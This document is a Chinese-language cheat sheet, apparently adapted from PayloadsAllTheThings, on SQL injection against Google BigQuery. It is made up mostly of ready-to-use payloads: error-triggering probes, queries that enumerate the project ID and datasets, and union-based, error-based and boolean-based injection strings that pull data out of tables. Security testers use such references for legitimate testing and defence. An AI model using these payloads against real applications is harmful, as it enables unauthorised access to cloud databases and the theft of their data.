# BigQuery Injection - Google BigQuery注入

[SEARCH_KEYWORDS]
漏洞类型: SQL Injection BigQuery Google Cloud 数据库注入
攻击类型: Data Extraction Information Disclosure Cloud Access
关键词: BigQuery Google Cloud @@project_id INFORMATION_SCHEMA backtick
技术: Union Based Error Based Boolean Based Heavy Query
限制: 无Time Based函数

[CONTENT]

## BigQuery注入概述

Google BigQuery SQL注入是一种安全漏洞，攻击者可通过操纵未正确清理的用户输入在Google BigQuery数据库上执行任意SQL查询。

## 检测方法

- 使用经典单引号触发错误: `'`
- 通过反引号语法识别BigQuery: ```SELECT .... FROM `` AS ...```

## 信息枚举

| SQL查询 | 描述 |
|---------|------|
| `SELECT @@project_id` | 获取项目ID |
| `SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA` | 获取所有数据集名称 |
| `select * from project_id.dataset_name.table_name` | 从特定项目和数据集获取数据 |

## BigQuery注释

| 类型 | 描述 |
|------|------|
| `#` | Hash注释 |
| `/* */` | C风格注释 |

## Union Based注入

```ps1
UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
' GROUP BY column_name UNION ALL SELECT column_name,1,1 FROM  (select column_name AS new_name from `project_id.dataset_name.table_name`) AS A GROUP BY column_name#
```

## Error Based注入

| SQL查询 | 描述 |
|---------|------|
| `' OR if(1/(length((select('a')))-1)=1,true,false) OR '` | 除零错误 |
| `select CAST(@@project_id AS INT64)` | 类型转换错误 |

## Boolean Based注入

```ps1
' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#
```

## Time Based注入

BigQuery语法中不存在时间函数，无法使用时间盲注技术。

## 参考文档

原始来源: PayloadsAllTheThings/SQL Injection/BigQuery Injection.md